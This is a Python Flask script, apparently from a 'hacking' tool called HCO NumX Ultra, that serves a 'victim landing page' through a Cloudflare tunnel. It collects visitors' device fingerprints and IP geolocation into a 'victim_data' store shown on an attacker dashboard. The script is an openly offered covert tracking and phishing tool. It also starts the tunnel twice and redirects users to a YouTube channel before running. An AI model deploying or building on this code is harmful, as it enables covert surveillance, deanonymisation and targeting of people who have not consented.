import os
import time
import threading
import subprocess
from flask import Flask, request, render_template, redirect
from utils import lookup_number, get_device_info, get_ip_info

app = Flask(__name__)
victim_data = {}

# 📌 Route to collect victim fingerprint
@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    ip = request.remote_addr
    geo = get_ip_info(ip)
    combined = {**geo, **data}
    victim_data[ip] = combined
    return '', 204

# 📊 View dashboard
@app.route('/dashboard')
def dashboard():
    return render_template("dashboard.html", data=victim_data)

# 🎯 Victim landing page
@app.route('/')
def index():
    return render_template("index.html")

# 🌐 Start Cloudflare tunnel
def start_cloudflare():
    os.system("cloudflared tunnel --url http://127.0.0.1:5000")

# 📽 Redirect for YouTube check
def verify_youtube():
    print("\n\x1b[1;32m┌─[ HCO NumX Ultra ]")
    print("│ This tool is not free.")
    print("│ Redirecting to YouTube... Please subscribe & return.\n│")
    time.sleep(8)
    os.system("am start https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\x1b[1;37m⏎ Press Enter to continue... ")

# 🚀 Start Flask + Tunnel
def main():
    verify_youtube()

    threading.Thread(target=start_cloudflare).start()
    time.sleep(3)

    print("\n🔗 Waiting for Cloudflare link...\n")
    subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:5000", shell=True)

    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == '__main__':
    main()
